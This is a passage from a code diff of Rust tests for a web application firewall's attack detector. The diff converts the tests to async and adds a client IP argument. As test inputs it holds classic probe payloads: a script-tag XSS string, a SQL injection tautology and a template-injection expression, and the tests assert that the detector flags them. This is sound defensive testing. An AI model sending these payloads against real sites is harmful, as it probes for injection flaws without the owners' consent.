+                &http::Method::POST,
+                "/search",
+                Some("q=<script>alert(1)</script>&id=1' OR '1'='1"),
+                &make_headers(),
+                Some(b"{{7*7}}"),
+            )
+            .await;
         assert!(result.0.is_some());
         let detected = result.0.unwrap();
         assert!(matches!(
@@ -4660,31 +4747,39 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_attack_fingerprint_present() {
+    #[tokio::test]
+    async fn test_attack_fingerprint_present() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("id=1' OR '1'='1"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let detected = result.0.unwrap();
         assert!(matches!(detected.attack_type, AttackType::Sqli));
     }
 
-    #[test]
-    fn test_matched_pattern_present() {
+    #[tokio::test]
+    async fn test_matched_pattern_present() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("q=<script>alert(1)</script>"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("q=<script>alert(1)</script>"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let detected = result.0.unwrap();
         assert!(matches!(detected.attack_type, AttackType::Xss));
